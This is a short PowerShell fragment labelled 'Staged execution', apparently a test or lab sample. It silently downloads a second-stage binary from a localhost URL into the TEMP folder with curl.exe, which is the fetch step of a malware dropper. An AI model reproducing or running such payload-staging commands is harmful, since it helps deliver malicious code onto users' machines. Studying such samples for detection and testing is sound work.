<# Staged execution #> $FetchUrl = 'https://localhost:8081/cdn/stage2.bin'; $DropPath = "$env:TEMP\stage2.bin"; curl.exe -s -L -o $DropPath $FetchUrl; Write-Output "stage 11 initialized"
